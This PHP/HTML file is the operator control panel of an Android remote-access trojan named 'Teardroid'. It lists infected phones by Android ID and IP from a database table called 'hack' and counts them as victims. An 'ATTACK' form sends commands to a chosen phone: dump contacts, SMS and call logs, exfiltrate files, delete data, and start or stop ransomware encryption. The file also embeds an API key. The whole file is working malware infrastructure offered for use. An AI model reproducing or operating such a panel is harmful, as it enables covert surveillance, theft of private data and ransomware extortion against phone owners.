<html lang="en">
<?php
include_once 'sql.php';
session_start();
session_regenerate_id();
if(!isset($_SESSION['user']))      // if there is no valid session
{
    header("Location: ../login.html");
}
?>

<head>
  <meta charset="UTF-8">
  <title>Teardroid</title>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">

  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500&display=swap" rel="stylesheet">


  <link rel="stylesheet" href="css/newstyle.css">


</head>

<body style="margin-top: 20px;">
  <div class="bodyshadow">
    <div class="container" style="margin-top: 40px;">
      <p class="display-6"><strong>Teardroid<strong></p>

      <div class="tr">
        <table class="table table-bordered table-hover main_table">
          <tr>
            <th>
              Android ID
            </th>
            <th>
              IP
            </th>
          </tr>
          <tr>

            <?php
            $sql = "SELECT id, ip FROM hack";
            $result = $conn->query($sql);
            if ($result->num_rows > 0) {
              // output data of each row
              while ($row = $result->fetch_assoc()) {
                echo "<tr><td>" . $row["id"] . "</td><td>" . $row["ip"] . "</td></tr>";
              }
              echo "</table>";
            } else {
              echo "<p>0 VICTIMS</p>";
            }
            $conn->close();
            ?>

            </td>
          </tr>
        </table>
        <center>
          <form action="/addcommand.php" class="row g-3">
            <div class="col-auto">
              <input type="text" class="form-control col-auto" name="id" placeholder="Enter Android ID">
            </div>
            <br />
            <div class="col-auto newselect">
              <select name="command" class="form-select form-select-md col-auto">
                <option value="con">Dump Contacts</option>
                <option value="smlg">Dump SMS</option>
                <option value="cllg">Dump Call_logs</option>
                <option value="infe">Dump File Locations</option>
                <option value="sdfe">Dump Sd Card File Locations</option>
                <option value="upld">Download File</option>
                <option value="nofi">Send Notification</option>
                <option value="del">Delete</option>
                <option value="chwl">Change Wallpaper</option>
                <option value="rnsm">Start Ransomware/Encrypt</option>
                <option value="dery">Stop Ransomware/Decrypt</option>
              </select>
            </div>
            <div class="col-auto">
              <input type="text" name="injection" class="form-control" placeholder="Enter path or url or command">
            </div>
            <div class="d-grid gap-2 col-3">
              <input type="submit" name="send" class="btn btn-primary" value="ATTACK">
            </div>
          </form>
        </center>
        <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <div class="d-flex justify-container-center" style="margin-bottom: 60px;">
          <div class="row">
            <div class="col-md-12">
              <div id="regions_div" style="width: 700px; height: 300px;"></div>
            </div>
          </div>
        </div>
        <script type="text/javascript">
          $(document).ready(function() {
            google.charts.load('current', {
              'packages': ['geochart'],
              'mapsApiKey': 'AIzaSyBlZA9SfofgBBJUmX5RE8rfKxRNCMz3dSQ'
            });
            google.charts.setOnLoadCallback(drawRegionsMap);

            function drawRegionsMap() {
              var data = google.visualization.arrayToDataTable([
                ['Country', 'Popularity'],
                ['Germany', 200],
                ['United States', 300],
                ['Brazil', 400],
                ['Canada', 500],
                ['INDIA', 600],
                ['RU', 700]
              ]);

              var options = {};

              var chart = new google.visualization.GeoChart(document.getElementById('regions_div'));

              chart.draw(data, options);
            }

          });
        </script>
      </div>
    </div>
</body>

</html>